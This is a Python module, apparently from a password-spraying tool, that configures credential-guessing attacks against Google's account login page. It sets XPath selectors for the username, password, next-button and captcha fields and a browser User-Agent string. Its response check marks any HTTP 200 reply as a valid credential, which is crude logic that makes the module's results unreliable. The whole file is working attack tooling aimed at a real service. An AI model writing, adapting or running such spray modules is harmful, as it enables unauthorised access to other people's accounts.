from .base import BaseSprayModule

class SprayModule(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'https://accounts.google.com'
    # body of request
    request_data = { 
    "username": {"type": "XPATH", "value": '//*[@id="identifierId"]'},
    "password": {"type": "NAME", "value": "password"},
    "button_next": {
        "type": "XPATH",
        "value": (
            "/html/body/div[1]/div[1]/div[2]/div/div[2]/"
            "div/div/div[2]/div/div[2]/div/div[1]/div/div/button"
        ),
    },
    "captcha": {"type": "XPATH", "value": '//*[@id="captchaimg"]'},
}
    # HTTP headers
    headers = {}
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ',
    }


    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None
        msg = 'application specific password required'

        if getattr(response, 'status_code', 0) == 200:
            valid = True
            exists = True
            msg = 'Valid cred'

        return (valid, exists, locked, msg)
